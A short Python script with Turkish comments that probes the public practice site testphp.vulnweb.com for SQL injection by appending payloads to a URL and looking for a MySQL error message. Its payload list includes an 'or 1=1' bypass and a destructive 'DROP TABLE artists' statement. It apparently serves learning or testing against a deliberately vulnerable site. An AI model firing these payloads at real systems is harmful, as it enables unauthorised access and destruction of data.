```python
import requests
import re

url = "http://testphp.vulnweb.com/artists.php?artist=1%27"

# SQL injection için hazırlanan payload'lar
payloads = [
    "'",
    "''",
    "' or 1=1 --",
    "'; DROP TABLE artists; --"
]

for payload in payloads:
    # SQL injection payload'unu URL'ye ekleyin
    r = requests.get(url + payload)

    # Response body'de SQL hatasını arayın
    if re.search("You have an error in your SQL syntax", r.text):
        print("SQL injection tespit edildi: " + payload)
```
